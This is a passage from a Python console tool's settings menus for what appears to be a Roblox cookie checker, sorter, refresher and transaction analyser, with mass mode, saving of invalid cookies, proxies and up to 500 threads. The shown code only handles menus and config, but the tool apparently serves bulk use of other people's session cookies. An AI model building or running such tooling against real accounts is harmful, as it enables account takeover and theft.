                                                                if settingsRCCCustomPlaceAdd == '0': return
                                                                if not settingsRCCCustomPlaceAdd.isdigit():
                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,                     f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}')
                                                                if len(settingsRCCCustomPlaceAdd) > 20:
                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_ID_50,              f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}')
                                                                if int(settingsRCCCustomPlaceAdd) in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
                                                                    return await errorOrCorrectHandler(True, 5, MT_Place_With_This_ID_Already_Exists,      f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}')

                                                                universeId = requests.get(f'https://apis.roblox.com/universes/v1/places/{settingsRCCCustomPlaceAdd}/universe').json()['universeId']

                                                                if universeId == None:
                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,                     f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}')

                                                                customPlaceGamepasses = requests.get(f'https://games.roblox.com/v1/games/{universeId}/game-passes?limit=100&sortOrder=Asc').json()
                                                                customPlaceBadges     = requests.get(f'https://badges.roblox.com/v1/universes/{universeId}/badges?limit=100&sortOrder=Asc').json()

                                                                if not customPlaceGamepasses['data'] and not customPlaceBadges['data']:
                                                                    return await errorOrCorrectHandler(True, 5, MT_The_Place_Has_No_Gamepasses_And_Badges, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}')

                                                                customPlaceInfo = requests.get(f'https://games.roblox.com/v1/games?universeIds={universeId}').json()

                                                                normalPlaceName = str(await removeEmojies(await removeBracketsAndIn(customPlaceInfo['data'][0]['name'], True, True))).replace('\"', '').strip()
                                                                if normalPlaceName != '':
                                                                    abbreviatedPlaceName = ''.join([word[0] for word in normalPlaceName.split()])
                                                                else:
                                                                    normalPlaceName      = f'Unknown_Normal_{settingsRCCCustomPlaceAdd}'
                                                                    abbreviatedPlaceName = f'UNK_{settingsRCCCustomPlaceAdd[:5]}'

                                                                config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].append(int(settingsRCCCustomPlaceAdd))

                                                                config['Roblox']['CookieChecker']['CustomPlaces'][settingsRCCCustomPlaceAdd] = [int(settingsRCCCustomPlaceAdd), [normalPlaceName, str(customPlaceInfo['data'][0]['name']).strip(), abbreviatedPlaceName.upper()], False]
                                                                if customPlaceGamepasses['data']: config['Roblox']['CookieChecker']['CustomPlaces'][f'{settingsRCCCustomPlaceAdd}_Gamepasses'] = [[gamepass['id'], str(gamepass['name']).strip(), False] for gamepass in customPlaceGamepasses['data']]
                                                                if customPlaceBadges['data']:     config['Roblox']['CookieChecker']['CustomPlaces'][f'{settingsRCCCustomPlaceAdd}_Badges']     = [[badge['id'],    str(badge['name']).strip(),    False] for badge    in customPlaceBadges['data']]

                                                                await autoSaveConfig()

                                                            await addCustomPlace()
                                                        elif settingsRCCCustomPlacesTab in ('+', '='):
                                                            for place in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
                                                                try: config['Roblox']['CookieChecker']['CustomPlaces'][str(place)][2] = True
                                                                except Exception: pass
                                                            await autoSaveConfig()
                                                        elif settingsRCCCustomPlacesTab in ('-', '_'):
                                                            for place in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
                                                                try: config['Roblox']['CookieChecker']['CustomPlaces'][str(place)][2] = False
                                                                except Exception: pass
                                                            await autoSaveConfig()
                                                        elif settingsRCCCustomPlacesTab.upper() in ('S', 'Ы'):
                                                            config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] ^= True
                                                            await autoSaveConfig()
                                                        elif settingsRCCCustomPlacesTab.upper() in ('R', 'К'):
                                                            loadConfig(configLoader['Loader']['Current_Config'])

                                                        await cls()
                                                        await lableASCII()
                                                case '0':
                                                    whileTrueStage3 = False
                                                    await removeLines(12)
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                    await removeLines(12)
                                                case _:
                                                    await removeLines(12)
                                    # Роблокс Куки Сортер (RCS)
                                    case '3':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Sorter}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Output_Filename}: {config['Roblox']['CookieSorter']['Output_Filename']}.txt\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsRCPTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsRCPTab.upper():
                                                case '1':
                                                    await removeLines(5)
                                                    newRobloxSorterOutputFilename = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_New_Filename}:{ANSI.CLEAR} ')

                                                    async def changeRobloxSorterOutputFilename():
                                                        if newRobloxSorterOutputFilename == '0': return await removeLines(5)
                                                        if newRobloxSorterOutputFilename.strip() == '':
                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_File_Name,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Sorter}')
                                                        if len(newRobloxSorterOutputFilename) > 50:
                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Name_50, f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Sorter}')
                                                        if any(char in newRobloxSorterOutputFilename for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']):
                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_File_Name,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Sorter}')

                                                        config['Roblox']['CookieSorter']['Output_Filename'] = newRobloxSorterOutputFilename.replace('.txt', '')
                                                        await autoSaveConfig()
                                                        await removeLines(5)

                                                    await changeRobloxSorterOutputFilename()
                                                case '0':
                                                    whileTrueStage3 = False
                                                    await removeLines(7)
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                    await removeLines(7)
                                                case _:
                                                    await removeLines(7)
                                    # Роблокс Куки Рефрешер (RCR)
                                    case '4':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Refresher}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Single_Mode}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Mass_Mode}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsRCRTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsRCRTab.upper():
                                                case '1':
                                                    whileTrueStage4 = True
                                                    await removeLines(8)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Single_Mode}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if 1 in config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save[1]} \'_XXXXXXXXXXXXXX...XXXXXXXXXXXXXX -> {MT_New_Cookie.lower()}\' {MT_In.lower()} refreshed_cookies_mode_1.txt\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if 2 in config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save[1]} \'{MT_New_Cookie.lower()}\' {MT_In.lower()} refreshed_cookies_mode_2.txt\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if 3 in config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save[1]} \'{MT_New_Cookie.lower()}\' {MT_In.lower()} refreshed_cookies_mode_3\\_XXXXXXXXXXXXXX...XXXXXXXXXXXXXX.txt\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCRSingleModeTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsRCRSingleModeTab.upper():
                                                            case '1' | '2' | '3':
                                                                caseValue = int(settingsRCRSingleModeTab)
                                                                saveModes = config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode']
                                                                if caseValue in saveModes: saveModes.remove(caseValue)
                                                                else:                      saveModes.append(caseValue)
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(9)

                                                        await autoSaveConfigAndRemoveLinesInSettings(settingsRCRSingleModeTab.upper(), ('1', '2', '3'), ('0', 'R', 'К'), 9)
                                                case '2':
                                                    whileTrueStage4 = True
                                                    await removeLines(8)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if 1 in config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save[1]} \'_XXXXXXXXXXXXXX...XXXXXXXXXXXXXX -> {MT_New_Cookie.lower()}\' {MT_In.lower()} refreshed_cookies_mode_1.txt\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if 2 in config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save[1]} \'{MT_New_Cookie.lower()}\' {MT_In.lower()} refreshed_cookies_mode_2.txt\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if 3 in config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save[1]} \'{MT_New_Cookie.lower()}\' {MT_In.lower()} refreshed_cookies_mode_3\\_XXXXXXXXXXXXXX...XXXXXXXXXXXXXX.txt\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieRefresher']['MassMode']['Save_Invalid_Cookies'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_Invalid_Cookies}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRCRMassModeTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsRCRMassModeTab.upper():
                                                            case '1' | '2' | '3':
                                                                caseValue = int(settingsRCRMassModeTab)
                                                                saveModes = config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode']
                                                                if caseValue in saveModes: saveModes.remove(caseValue)
                                                                else:                      saveModes.append(caseValue)
                                                            case '4':
                                                                config['Roblox']['CookieRefresher']['MassMode']['Save_Invalid_Cookies'] ^= True
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(10)

                                                        await autoSaveConfigAndRemoveLinesInSettings(settingsRCRMassModeTab.upper(), ('1', '2', '3', '4'), ('0', 'R', 'К'), 10)
                                                case '0':
                                                    whileTrueStage3 = False
                                                    await removeLines(8)
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                    await removeLines(8)
                                                case _:
                                                    await removeLines(8)
                                    # Анализ транзакций
                                    case '5':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Proxy}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Places}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsTransactionAnalysisTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsTransactionAnalysisTab.upper():
                                                # Общие
                                                case '1':
                                                    whileTrueStage4 = True
                                                    await removeLines(9)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_First_Check_All_Cookies_For_Valid}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Number_Of_Threads_For_Valid_Checker}: {config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker'] if str(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker']).isdigit() and (0 < int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker']) <= 500) else 10}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Number_Of_Threads_For_Transaction_Analysis}: {config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis'] if str(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']).isdigit() and (0 < int(config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis']) <= 500) else 10}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['General']['Use_SSL'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Use_SSL}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['General']['Save_All_Places_In_One_File'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_All_Places_In_One_File}\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['General']['Save_Places_To_Different_Files'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_Places_To_Different_Files}\n [{ANSI.FG.PINK}7{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['General']['Add_Nick_After_Cookie_In_Folder_Names'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Add_Nick_After_Cookie_In_Folder_Names}\n [{ANSI.FG.PINK}8{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['General']['Add_Robux_After_Place_In_File_Names'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Add_Robux_After_Place_In_File_Names}\n [{ANSI.FG.PINK}9{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Indentation_Option}: {MT_Max_Indentation if config['Roblox']['TransactionAnalysis']['General']['Indentation_Options'] == 'MaxIndent' else MT_No_Indentation}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsTransactionAnalysisGeneralTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsTransactionAnalysisGeneralTab.upper():
                                                            case '1':
                                                                config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid'] ^= True
                                                            case '2':
                                                                whileTrueStage5 = True
                                                                await removeLines(15)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsTAGeneralValidCheckerThreadsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Number_Of_Threads}:{ANSI.CLEAR} ')

                                                                    async def changeTANumberOfThreadsForValidChecker():
                                                                        if settingsTAGeneralValidCheckerThreadsTab == '0': return await removeLines(5)
                                                                        if not settingsTAGeneralValidCheckerThreadsTab.isdigit():
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Value,                 f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}')
                                                                        if int(settingsTAGeneralValidCheckerThreadsTab) > 500:
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Number_Of_Threads_500, f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}')

                                                                        config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker'] = int(settingsTAGeneralValidCheckerThreadsTab)
                                                                        await autoSaveConfig()
                                                                        await removeLines(5)

                                                                    await changeTANumberOfThreadsForValidChecker()
                                                                    whileTrueStage5 = False
                                                            case '3':
                                                                whileTrueStage5 = True
                                                                await removeLines(15)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsTAGeneralTransactionAnalysisThreadsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Number_Of_Threads}:{ANSI.CLEAR} ')

                                                                    async def changeTANumberOfThreadsForTransactionsAnalysis():
                                                                        if settingsTAGeneralTransactionAnalysisThreadsTab == '0': return await removeLines(5)
                                                                        if not settingsTAGeneralTransactionAnalysisThreadsTab.isdigit():
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Value,                 f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}')
                                                                        if int(settingsTAGeneralTransactionAnalysisThreadsTab) > 500:
                                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Number_Of_Threads_500, f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_General}')

                                                                        config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis'] = int(settingsTAGeneralTransactionAnalysisThreadsTab)
                                                                        await autoSaveConfig()
                                                                        await removeLines(5)

                                                                    await changeTANumberOfThreadsForTransactionsAnalysis()
                                                                    whileTrueStage5 = False
                                                            case '4':
                                                                config['Roblox']['TransactionAnalysis']['General']['Use_SSL'] ^= True
                                                            case '5':
                                                                config['Roblox']['TransactionAnalysis']['General']['Save_All_Places_In_One_File'] ^= True
                                                            case '6':
                                                                config['Roblox']['TransactionAnalysis']['General']['Save_Places_To_Different_Files'] ^= True
                                                            case '7':
                                                                config['Roblox']['TransactionAnalysis']['General']['Add_Nick_After_Cookie_In_Folder_Names'] ^= True
                                                            case '8':
                                                                config['Roblox']['TransactionAnalysis']['General']['Add_Robux_After_Place_In_File_Names'] ^= True
                                                            case '9':
                                                                config['Roblox']['TransactionAnalysis']['General']['Indentation_Options'] = 'MaxIndent' if config['Roblox']['TransactionAnalysis']['General']['Indentation_Options'] == 'NoIndent' else 'NoIndent'
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(15)
                                                        
                                                        await autoSaveConfigAndRemoveLinesInSettings(settingsTransactionAnalysisGeneralTab.upper(), ('1', '4', '5', '6', '7', '8', '9'), ('0', 'R', 'К'), 15)
                                                # Прокси
                                                case '2':
                                                    whileTrueStage4 = True
                                                    await removeLines(9)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Proxy}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Format}: {ANSI.FG.GRAY}protocol://{ANSI.CLEAR + ANSI.DECOR.BOLD}ip:port:username:password\n  ┃\n [{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Use_Proxy}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Auto_Protocol_If_Not_Specified}: {config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] if config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] in ('http', 'socks4', 'socks5') else 'http'}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsTAProxyTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsTAProxyTab.upper():
                                                            case '1':
                                                                config['Roblox']['TransactionAnalysis']['Proxy']['Use_Proxy'] ^= True
                                                            case '2':
                                                                whileTrueStage5 = True
                                                                await removeLines(10)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Proxy}\\{MT_Auto_Protocol}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] == 'http' or config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] not in ('http', 'socks4', 'socks5') else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} http\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] == 'socks4' else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} socks4\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] == 'socks5' else 